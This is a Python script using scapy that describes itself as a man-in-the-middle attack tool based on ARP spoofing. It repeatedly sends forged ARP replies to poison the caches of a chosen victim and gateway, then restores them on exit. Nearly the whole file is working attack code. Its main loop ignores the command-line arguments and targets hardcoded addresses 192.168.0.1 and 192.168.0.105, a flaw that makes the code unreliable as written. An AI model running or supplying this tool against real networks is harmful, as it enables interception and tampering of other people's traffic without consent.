#!/bin/python3


import ipaddress
from time import sleep
import argparse
import socket

try:
    import scapy.all as scapy
except:
    print("Scapy library not found.")



argParser = argparse.ArgumentParser(description="Script to run a man in the middle attack using ARP spoofing")

argParser.add_argument('-g', '--gateway', type=str, help="IP address of the gateway or access point of the network", metavar='', required=True)
argParser.add_argument('-v', '--victim', type=str, help="IP address of the victim who you want to man in the middle", metavar='', required=True)

args = argParser.parse_args()




def restoreARPCaches(victimIP, correctIP):
    victimMAC = ipToMAC(victimIP)
    correctMAC = ipToMAC(correctIP)
    packet = scapy.ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=correctIP, hwsrc=correctMAC) # Setting hwsrc here is required, because we are trying to restore. Therefore need to set it manually
    scapy.send(packet, count=3, verbose=False)


def ipToMAC(ipAddress):
    arpFrame = scapy.ARP(pdst=ipAddress)
    etherFrame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Send to broadcast address

    arpRequest = etherFrame/arpFrame
    
    nodesFound = scapy.srp(arpRequest, timeout=1, verbose=False)[0] 
    
    return nodesFound[0][1].hwsrc


def arpSpoof(victimIP, gatewayIP):
    victimMAC = ipToMAC(victimIP)
    packet = scapy.ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=gatewayIP)  # Tell target that current machine has the router's IP address, scapy automatically sets the hwsrc to current machines MAC address
    
    scapy.send(packet, verbose=False)


def ipIsValid(ipAddress):
    try:
        socket.inet_aton(ipAddress)
        return True

    except socket.error:
        return False




if __name__ == "__main__":
    packetsSent = 0
    
    if ipIsValid(args.victim) and ipIsValid(args.gateway):
        try:
            while(True):
                arpSpoof('192.168.0.1', '192.168.0.105')
                arpSpoof('192.168.0.105', '192.168.0.1')
                packetsSent += 2
                print("\rSpoof Packets Sent.. " + str(packetsSent), end='')
    
                sleep(3)
    
        except KeyboardInterrupt: # When program stops, the ARP tables for the access point and our victim need to be fixed and restored back to what they originally were
            print("\n\nRestoring ARP Caches. Thank you for using this ARP spoofer!\n")
            restoreARPCaches("192.168.0.105", "192.168.0.1")
            restoreARPCaches("192.168.0.1", "192.168.0.105")
            print("\n\nDone!")
    
        except IndexError:
            print("Index error. Some IP addresses may not exist")
    
        except PermissionError:
            # This program utilises sockets and networking packet creation, therefore will need sudo to be run
            print("Error. Need to use sudo to run this program")
    else:
        print("Error. IP addresses invalid")

